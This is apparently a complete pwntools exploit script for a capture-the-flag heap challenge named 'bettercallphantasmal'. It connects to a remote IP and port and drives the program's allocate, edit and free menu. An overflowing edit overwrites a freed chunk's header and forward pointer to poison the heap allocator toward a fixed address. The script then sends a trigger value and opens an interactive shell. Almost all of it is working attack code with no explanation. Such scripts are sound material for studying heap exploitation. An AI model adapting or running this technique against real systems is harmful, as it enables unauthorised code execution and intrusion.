#!/usr/bin/env python3

from pwn import *

exe = ELF("./bettercallphantasmal_patched")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("198.211.116.222",9003)

def alloc(size, content):
    r.sendlineafter("Your choice :", "1")
    r.sendlineafter("Size of the page : ", str(size))
    r.sendlineafter("Content of the page:", content)

def edit(index, size, data):
    r.sendlineafter("Your choice :", "3")
    r.sendlineafter("Index :", str(index))
    r.sendlineafter("Size of the page : ", str(size))
    r.sendlineafter("Content of the page : ", data)


def free(index):
    r.sendlineafter("Your choice :", "2")
    r.sendlineafter("id :", str(index))

def main():
     

    alloc(0x100, "MAHER")
    alloc(0x68, "LOL")
    free(1)
    edit(0, 0x120, b"M"*0x100 + p64(0) + p64(0x71) + p64(0x60209d-0x10))
    alloc(0x68, "LOL")
    alloc(0x68, b"M"*0x67)
    r.sendlineafter(":", "31337")
    r.interactive()


if __name__ == "__main__":
    main()
